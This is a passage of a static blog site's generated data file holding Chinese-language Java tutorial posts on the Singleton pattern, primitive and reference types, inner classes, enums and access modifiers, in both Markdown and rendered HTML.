class=\"line\">        this.data = data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.bonc.sms.controller;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.bonc.sms.entity.PlatformChannelSpEntity;</span><br><span class=\"line\">import com.bonc.sms.entity.PlatformEntity;</span><br><span class=\"line\">import com.bonc.sms.service.PlatformService;</span><br><span class=\"line\">import com.bonc.sms.util.Singleton;</span><br><span class=\"line\">import org.slf4j.Logger;</span><br><span class=\"line\">import org.slf4j.LoggerFactory;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.boot.CommandLineRunner;</span><br><span class=\"line\">import org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.ArrayList;</span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\">import java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class InitDid implements CommandLineRunner &#123;</span><br><span class=\"line\">    private static final Logger logger = LoggerFactory.getLogger(InitDid.class);</span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    PlatformService platformService;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run(String... strings) &#123;</span><br><span class=\"line\">        Map data = new HashMap&lt;String,Map&gt;();</span><br><span class=\"line\">        System.out.println(&quot;**************************platform*************initdid&quot;);</span><br><span class=\"line\">        List&lt;PlatformEntity&gt; platform = platformService.getPlatformAll();</span><br><span class=\"line\">        System.out.println(&quot;***:&quot;+ platform.size());</span><br><span class=\"line\">        for(PlatformEntity platformEntity: platform)&#123;</span><br><span class=\"line\">//            String url = platformService.getSpUrl(platformEntity.getSp_number()).getUrl();</span><br><span class=\"line\">            Map value = new HashMap&lt;String, String&gt;();</span><br><span class=\"line\">            value.put(&quot;platform_name&quot;, platformEntity.getPlatform_name());</span><br><span class=\"line\">            value.put(&quot;platform_address&quot;, platformEntity.getPlatform_address());</span><br><span class=\"line\">            value.put(&quot;platform_type&quot;, platformEntity.getPlatform_type());</span><br><span class=\"line\">            value.put(&quot;platform_key&quot;,platformEntity.getPlatform_key());</span><br><span class=\"line\">            List&lt;PlatformChannelSpEntity&gt; platformChannelSpEntities = platformService.getPlatformChannelSp(platformEntity.getPlatform_id());</span><br><span class=\"line\">            List&lt;String&gt; channel = new ArrayList&lt;String&gt;();</span><br><span class=\"line\">            Map&lt;String,String&gt; channel_sp = new HashMap&lt;String, String&gt;();</span><br><span class=\"line\">            Map&lt;String,String&gt; channel_url = new HashMap&lt;String, String&gt;();</span><br><span class=\"line\">            for(PlatformChannelSpEntity platformChannelSpEntity: platformChannelSpEntities)&#123;</span><br><span class=\"line\">                channel.add(platformChannelSpEntity.getChannel_id());</span><br><span class=\"line\">                channel_sp.put(platformChannelSpEntity.getChannel_id(),platformChannelSpEntity.getSp_number());</span><br><span class=\"line\">                String url = platformService.getSpUrl(platformChannelSpEntity.getChannel_id());</span><br><span class=\"line\">                channel_url.put(platformChannelSpEntity.getChannel_id(),url);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            value.put(&quot;channel&quot;,channel);</span><br><span class=\"line\">            value.put(&quot;channel_sp&quot;,channel_sp);</span><br><span class=\"line\">            value.put(&quot;channel_url&quot;, channel_url);</span><br><span class=\"line\">            data.put(platformEntity.getPlatform_id(), value);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Singleton.getInstance().setData(data);</span><br><span class=\"line\">        logger.info(&quot;需要的平台缓存信息初始化完成&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-用途\"><a href=\"#1-用途\" class=\"headerlink\" title=\"1.用途\"></a>1.用途</h4><p>用来维护一个全局的类，保存某些常用数据，减少资源消耗。</p>\n<h4 id=\"2-原理\"><a href=\"#2-原理\" class=\"headerlink\" title=\"2.原理\"></a>2.原理</h4><p>维护一个类，确保只有单一的对象被创建（创建一次），提供一个唯一的访问接口。私有的构造函数确保外部不能进行访问。</p>\n<h4 id=\"3-两种常用实现\"><a href=\"#3-两种常用实现\" class=\"headerlink\" title=\"3.两种常用实现\"></a>3.两种常用实现</h4><p>1.饿汉式<br>线程安全，非懒加载<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Singleton &#123;</span><br><span class=\"line\">    //这句饿汉式的关键，类加载时初始化</span><br><span class=\"line\">    private static  final Singleton instance = new Singleton();</span><br><span class=\"line\">    //维护的数据</span><br><span class=\"line\">    private Map&lt;String,Map&gt; data;</span><br><span class=\"line\">    //构造函数,初始化一次</span><br><span class=\"line\">    private Singleton()&#123;</span><br><span class=\"line\">        this.data = new HashMap&lt;String, Map&gt;();</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    //获取实例</span><br><span class=\"line\">    public static final Singleton getInstance()&#123;</span><br><span class=\"line\">        return instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //全局获取维护的数据</span><br><span class=\"line\">    public  Map&lt;String, Map&gt; getData()&#123;</span><br><span class=\"line\">        return this.data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //修改数据</span><br><span class=\"line\">    public void setData(Map&lt;String, Map&gt; data) &#123;</span><br><span class=\"line\">        this.data = data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>2.静态内部类<br>可用调用时再初始化加载(lazyLoad)。<br><br>线程安全，懒加载</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Singleton &#123;</span><br><span class=\"line\">    //静态内部类</span><br><span class=\"line\">    private static class SingletonHolder&#123;</span><br><span class=\"line\">        private static  final Singleton instance = new Singleton();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //维护的数据</span><br><span class=\"line\">    private Map&lt;String,Map&gt; data;</span><br><span class=\"line\">    //构造函数,初始化一次</span><br><span class=\"line\">    private Singleton()&#123;</span><br><span class=\"line\">        this.data = new HashMap&lt;String, Map&gt;();</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    //获取实例</span><br><span class=\"line\">    public static final Singleton getInstance()&#123;</span><br><span class=\"line\">        return SingletonHolder.instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //全局获取维护的数据</span><br><span class=\"line\">    public  Map&lt;String, Map&gt; getData()&#123;</span><br><span class=\"line\">        return this.data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //修改数据</span><br><span class=\"line\">    public void setData(Map&lt;String, Map&gt; data) &#123;</span><br><span class=\"line\">        this.data = data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.bonc.sms.controller;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.bonc.sms.entity.PlatformChannelSpEntity;</span><br><span class=\"line\">import com.bonc.sms.entity.PlatformEntity;</span><br><span class=\"line\">import com.bonc.sms.service.PlatformService;</span><br><span class=\"line\">import com.bonc.sms.util.Singleton;</span><br><span class=\"line\">import org.slf4j.Logger;</span><br><span class=\"line\">import org.slf4j.LoggerFactory;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.boot.CommandLineRunner;</span><br><span class=\"line\">import org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.ArrayList;</span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\">import java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class InitDid implements CommandLineRunner &#123;</span><br><span class=\"line\">    private static final Logger logger = LoggerFactory.getLogger(InitDid.class);</span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    PlatformService platformService;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run(String... strings) &#123;</span><br><span class=\"line\">        Map data = new HashMap&lt;String,Map&gt;();</span><br><span class=\"line\">        System.out.println(&quot;**************************platform*************initdid&quot;);</span><br><span class=\"line\">        List&lt;PlatformEntity&gt; platform = platformService.getPlatformAll();</span><br><span class=\"line\">        System.out.println(&quot;***:&quot;+ platform.size());</span><br><span class=\"line\">        for(PlatformEntity platformEntity: platform)&#123;</span><br><span class=\"line\">//            String url = platformService.getSpUrl(platformEntity.getSp_number()).getUrl();</span><br><span class=\"line\">            Map value = new HashMap&lt;String, String&gt;();</span><br><span class=\"line\">            value.put(&quot;platform_name&quot;, platformEntity.getPlatform_name());</span><br><span class=\"line\">            value.put(&quot;platform_address&quot;, platformEntity.getPlatform_address());</span><br><span class=\"line\">            value.put(&quot;platform_type&quot;, platformEntity.getPlatform_type());</span><br><span class=\"line\">            value.put(&quot;platform_key&quot;,platformEntity.getPlatform_key());</span><br><span class=\"line\">            List&lt;PlatformChannelSpEntity&gt; platformChannelSpEntities = platformService.getPlatformChannelSp(platformEntity.getPlatform_id());</span><br><span class=\"line\">            List&lt;String&gt; channel = new ArrayList&lt;String&gt;();</span><br><span class=\"line\">            Map&lt;String,String&gt; channel_sp = new HashMap&lt;String, String&gt;();</span><br><span class=\"line\">            Map&lt;String,String&gt; channel_url = new HashMap&lt;String, String&gt;();</span><br><span class=\"line\">            for(PlatformChannelSpEntity platformChannelSpEntity: platformChannelSpEntities)&#123;</span><br><span class=\"line\">                channel.add(platformChannelSpEntity.getChannel_id());</span><br><span class=\"line\">                channel_sp.put(platformChannelSpEntity.getChannel_id(),platformChannelSpEntity.getSp_number());</span><br><span class=\"line\">                String url = platformService.getSpUrl(platformChannelSpEntity.getChannel_id());</span><br><span class=\"line\">                channel_url.put(platformChannelSpEntity.getChannel_id(),url);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            value.put(&quot;channel&quot;,channel);</span><br><span class=\"line\">            value.put(&quot;channel_sp&quot;,channel_sp);</span><br><span class=\"line\">            value.put(&quot;channel_url&quot;, channel_url);</span><br><span class=\"line\">            data.put(platformEntity.getPlatform_id(), value);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Singleton.getInstance().setData(data);</span><br><span class=\"line\">        logger.info(&quot;需要的平台缓存信息初始化完成&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"java基本类型","date":"2018-09-21T20:23:45.000Z","_content":"#### 1.基本类型\n位bit/字节byte关系<br>\nbit指01二进制位，例：0000为4位<br>\nbyte为8位，即00000000八位二进制为一字节，通常用十六进制表示0x00\n- short：16位，最大数据存储量是65536，数据范围是-32768~32767之间。\n- int：32位，最大数据存储容量是2的32次方减1，数据范围是负的2的31次方到正的2的31次方减1。\n- long：64位，最大数据存储容量是2的64次方减1，数据范围为负的2的63次方到正的2的63次方减1。\n- float：32位，数据范围在3.4e-45~1.4e38，直接赋值时必须在数字后加上f或F。\n- double：64位，数据范围在4.9e-324~1.8e308，赋值时可以加d或D也可以不加。\n- boolean：只有true和false两个取值。\n- char：16位，存储Unicode码，用单引号赋值。\n\n基本类型并不是类对象。<br>\n为了让这8中基本类型也能面向对象，Java为其提供了包装器类型.\n对应上面顺序为：Byte, Short, Integer, Long, Float, Double, Boolean, Character\n现在，这些包装器类型都是面向对象的类了，具有对象方法可以进行很多高级的操作，而不是简单的基本类型，都是引用类型了.\njava提供了自动拆箱/装箱来实现基本类型数据和包装器类型数据之间相互转换、赋值。\n\n#### 2.引用类型\n- 强引用<br>\n最常用的引用类型，如Object obj = new Object(); 。只要强引用存在则GC时则必定不被回收。<br>\n其它三个暂时不太理解，以后接触再添加\n- 软引用\n- 弱引用\n- 虚引用\n\n#### 3.基本类型与引用类型区别\n基本类型就是一个值<br>\n引用类型：它的值是指向内存空间的引用，就是地址，所指向的内存中保存着变量<br>\n<!-- more -->\n#### 4.引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\n- 引用(reference) :\n指向一个对象<br>\n- 实例(instance):\n按照通俗的说法，每个对象都是某个类（class）的一个实例（instance），这里，‘类’就是‘类型’的同义词\n\n- 内部类<br>\n将一个类定义在另一个类的内部。\n内部类可以很好的解决多重继承问题。（继承接口或类，接口本来可以多重继承，类不能多重继承，内部类可以解决类不能多重继承问题）。<br>\n使用内部类最吸引人的原因是：每个内部类都能独立地继承一个（接口的）实现，所以无论外围类是否已经继承了某个（接口的）实现，对于内部类都没有影响。<br>\n原文连接：https://blog.csdn.net/qq_38242407/article/details/78159494\n\n父类：\n```\npublic class Father {\n\tpublic int strong(){\n\t\treturn 9;\n\t}\n}\npublic class Mother {\n\tpublic int kind(){\n\t\treturn 8;\n\t}\n}\n```\n\n子类，内部类多重继承\n```\npublic class Son {\n  //内部类继承Father类\n\tclass Father_1 extends Father{  //继承一\n\t\tpublic int strong(){\n\t\t\treturn super.strong() + 1;\n\t\t}\n\t}\n\tclass Mother_1 extends  Mother{  //继承二\n\t\tpublic int kind(){\n\t\t\treturn super.kind() - 2;\n\t\t}\n\t}\n   //获取父类1方法\n\tpublic int getStrong(){\n\t\treturn new Father_1().strong();\n\t}\n   //获取父类2方法\n\tpublic int getKind(){\n\t\treturn new Mother_1().kind();\n\t}\n}\n```\n\n- 枚举类<br>\n在某些情况下，一个类的对象时有限且固定的，如季节类，它只有春夏秋冬4个对象这种实例有限且固定的类，在 Java 中被称为枚举类。<br>\n枚举类最基本的用法是实现一个类型安全的枚举（final)。\n枚举常量用逗号分隔,每个枚举常量都是一个对象。\n每一个枚举都是枚举类的实例，支持初始化/构造函数/匿名类/覆盖基类等。\n\n- 访问控制符<br>\npublic\t共有的，对所有类可见。<br>\nprotected\t受保护的，对同一包内的类和所有子类可见。<br>\nprivate\t私有的，在同一类内可见。<br>\ndefault (即不加修饰控制符情况下)默认的\t在同一包内可见。默认不使用任何修饰符。<br>\n","source":"_posts/java/java基本类型.md","raw":"---\ntitle: java基本类型\ndate: 2018-09-21 16:23:45\ntags: [java]\n---\n#### 1.基本类型\n位bit/字节byte关系<br>\nbit指01二进制位，例：0000为4位<br>\nbyte为8位，即00000000八位二进制为一字节，通常用十六进制表示0x00\n- short：16位，最大数据存储量是65536，数据范围是-32768~32767之间。\n- int：32位，最大数据存储容量是2的32次方减1，数据范围是负的2的31次方到正的2的31次方减1。\n- long：64位，最大数据存储容量是2的64次方减1，数据范围为负的2的63次方到正的2的63次方减1。\n- float：32位，数据范围在3.4e-45~1.4e38，直接赋值时必须在数字后加上f或F。\n- double：64位，数据范围在4.9e-324~1.8e308，赋值时可以加d或D也可以不加。\n- boolean：只有true和false两个取值。\n- char：16位，存储Unicode码，用单引号赋值。\n\n基本类型并不是类对象。<br>\n为了让这8中基本类型也能面向对象，Java为其提供了包装器类型.\n对应上面顺序为：Byte, Short, Integer, Long, Float, Double, Boolean, Character\n现在，这些包装器类型都是面向对象的类了，具有对象方法可以进行很多高级的操作，而不是简单的基本类型，都是引用类型了.\njava提供了自动拆箱/装箱来实现基本类型数据和包装器类型数据之间相互转换、赋值。\n\n#### 2.引用类型\n- 强引用<br>\n最常用的引用类型，如Object obj = new Object(); 。只要强引用存在则GC时则必定不被回收。<br>\n其它三个暂时不太理解，以后接触再添加\n- 软引用\n- 弱引用\n- 虚引用\n\n#### 3.基本类型与引用类型区别\n基本类型就是一个值<br>\n引用类型：它的值是指向内存空间的引用，就是地址，所指向的内存中保存着变量<br>\n<!-- more -->\n#### 4.引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\n- 引用(reference) :\n指向一个对象<br>\n- 实例(instance):\n按照通俗的说法，每个对象都是某个类（class）的一个实例（instance），这里，‘类’就是‘类型’的同义词\n\n- 内部类<br>\n将一个类定义在另一个类的内部。\n内部类可以很好的解决多重继承问题。（继承接口或类，接口本来可以多重继承，类不能多重继承，内部类可以解决类不能多重继承问题）。<br>\n使用内部类最吸引人的原因是：每个内部类都能独立地继承一个（接口的）实现，所以无论外围类是否已经继承了某个（接口的）实现，对于内部类都没有影响。<br>\n原文连接：https://blog.csdn.net/qq_38242407/article/details/78159494\n\n父类：\n```\npublic class Father {\n\tpublic int strong(){\n\t\treturn 9;\n\t}\n}\npublic class Mother {\n\tpublic int kind(){\n\t\treturn 8;\n\t}\n}\n```\n\n子类，内部类多重继承\n```\npublic class Son {\n  //内部类继承Father类\n\tclass Father_1 extends Father{  //继承一\n\t\tpublic int strong(){\n\t\t\treturn super.strong() + 1;\n\t\t}\n\t}\n\tclass Mother_1 extends  Mother{  //继承二\n\t\tpublic int kind(){\n\t\t\treturn super.kind() - 2;\n\t\t}\n\t}\n   //获取父类1方法\n\tpublic int getStrong(){\n\t\treturn new Father_1().strong();\n\t}\n   //获取父类2方法\n\tpublic int getKind(){\n\t\treturn new Mother_1().kind();\n\t}\n}\n```\n\n- 枚举类<br>\n在某些情况下，一个类的对象时有限且固定的，如季节类，它只有春夏秋冬4个对象这种实例有限且固定的类，在 Java 中被称为枚举类。<br>\n枚举类最基本的用法是实现一个类型安全的枚举（final)。\n枚举常量用逗号分隔,每个枚举常量都是一个对象。\n每一个枚举都是枚举类的实例，支持初始化/构造函数/匿名类/覆盖基类等。\n\n- 访问控制符<br>\npublic\t共有的，对所有类可见。<br>\nprotected\t受保护的，对同一包内的类和所有子类可见。<br>\nprivate\t私有的，在同一类内可见。<br>\ndefault (即不加修饰控制符情况下)默认的\t在同一包内可见。默认不使用任何修饰符。<br>\n","slug":"java/java基本类型","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321hs000t6dcp3uhj5kwo","content":"<h4 id=\"1-基本类型\"><a href=\"#1-基本类型\" class=\"headerlink\" title=\"1.基本类型\"></a>1.基本类型</h4><p>位bit/字节byte关系<br><br>bit指01二进制位，例：0000为4位<br><br>byte为8位，即00000000八位二进制为一字节，通常用十六进制表示0x00</p>\n<ul>\n<li>short：16位，最大数据存储量是65536，数据范围是-32768~32767之间。</li>\n<li>int：32位，最大数据存储容量是2的32次方减1，数据范围是负的2的31次方到正的2的31次方减1。</li>\n<li>long：64位，最大数据存储容量是2的64次方减1，数据范围为负的2的63次方到正的2的63次方减1。</li>\n<li>float：32位，数据范围在3.4e-45~1.4e38，直接赋值时必须在数字后加上f或F。</li>\n<li>double：64位，数据范围在4.9e-324~1.8e308，赋值时可以加d或D也可以不加。</li>\n<li>boolean：只有true和false两个取值。</li>\n<li>char：16位，存储Unicode码，用单引号赋值。</li>\n</ul>\n<p>基本类型并不是类对象。<br><br>为了让这8中基本类型也能面向对象，Java为其提供了包装器类型.<br>对应上面顺序为：Byte, Short, Integer, Long, Float, Double, Boolean, Character<br>现在，这些包装器类型都是面向对象的类了，具有对象方法可以进行很多高级的操作，而不是简单的基本类型，都是引用类型了.<br>java提供了自动拆箱/装箱来实现基本类型数据和包装器类型数据之间相互转换、赋值。</p>\n<h4 id=\"2-引用类型\"><a href=\"#2-引用类型\" class=\"headerlink\" title=\"2.引用类型\"></a>2.引用类型</h4><ul>\n<li>强引用<br><br>最常用的引用类型，如Object obj = new Object(); 。只要强引用存在则GC时则必定不被回收。<br><br>其它三个暂时不太理解，以后接触再添加</li>\n<li>软引用</li>\n<li>弱引用</li>\n<li>虚引用</li>\n</ul>\n<h4 id=\"3-基本类型与引用类型区别\"><a href=\"#3-基本类型与引用类型区别\" class=\"headerlink\" title=\"3.基本类型与引用类型区别\"></a>3.基本类型与引用类型区别</h4><p>基本类型就是一个值<br><br>引用类型：它的值是指向内存空间的引用，就是地址，所指向的内存中保存着变量<br><br><a id=\"more\"></a></p>\n<h4 id=\"4-引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\"><a href=\"#4-引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\" class=\"headerlink\" title=\"4.引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\"></a>4.引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法</h4><ul>\n<li>引用(reference) :<br>指向一个对象<br></li>\n<li><p>实例(instance):<br>按照通俗的说法，每个对象都是某个类（class）的一个实例（instance），这里，‘类’就是‘类型’的同义词</p>\n</li>\n<li><p>内部类<br><br>将一个类定义在另一个类的内部。<br>内部类可以很好的解决多重继承问题。（继承接口或类，接口本来可以多重继承，类不能多重继承，内部类可以解决类不能多重继承问题）。<br><br>使用内部类最吸引人的原因是：每个内部类都能独立地继承一个（接口的）实现，所以无论外围类是否已经继承了某个（接口的）实现，对于内部类都没有影响。<br><br>原文连接：<a href=\"https://blog.csdn.net/qq_38242407/article/details/78159494\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_38242407/article/details/78159494</a></p>\n</li>\n</ul>\n<p>父类：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Father &#123;</span><br><span class=\"line\">\tpublic int strong()&#123;</span><br><span class=\"line\">\t\treturn 9;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">public class Mother &#123;</span><br><span class=\"line\">\tpublic int kind()&#123;</span><br><span class=\"line\">\t\treturn 8;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>子类，内部类多重继承<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Son &#123;</span><br><span class=\"line\">  //内部类继承Father类</span><br><span class=\"line\">\tclass Father_1 extends Father&#123;  //继承一</span><br><span class=\"line\">\t\tpublic int strong()&#123;</span><br><span class=\"line\">\t\t\treturn super.strong() + 1;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tclass Mother_1 extends  Mother&#123;  //继承二</span><br><span class=\"line\">\t\tpublic int kind()&#123;</span><br><span class=\"line\">\t\t\treturn super.kind() - 2;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">   //获取父类1方法</span><br><span class=\"line\">\tpublic int getStrong()&#123;</span><br><span class=\"line\">\t\treturn new Father_1().strong();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">   //获取父类2方法</span><br><span class=\"line\">\tpublic int getKind()&#123;</span><br><span class=\"line\">\t\treturn new Mother_1().kind();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><p>枚举类<br><br>在某些情况下，一个类的对象时有限且固定的，如季节类，它只有春夏秋冬4个对象这种实例有限且固定的类，在 Java 中被称为枚举类。<br><br>枚举类最基本的用法是实现一个类型安全的枚举（final)。<br>枚举常量用逗号分隔,每个枚举常量都是一个对象。<br>每一个枚举都是枚举类的实例，支持初始化/构造函数/匿名类/覆盖基类等。</p>\n</li>\n<li><p>访问控制符<br><br>public    共有的，对所有类可见。<br><br>protected    受保护的，对同一包内的类和所有子类可见。<br><br>private    私有的，在同一类内可见。<br><br>default (即不加修饰控制符情况下)默认的    在同一包内可见。默认不使用任何修饰符。<br></p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h4 id=\"1-基本类型\"><a href=\"#1-基本类型\" class=\"headerlink\" 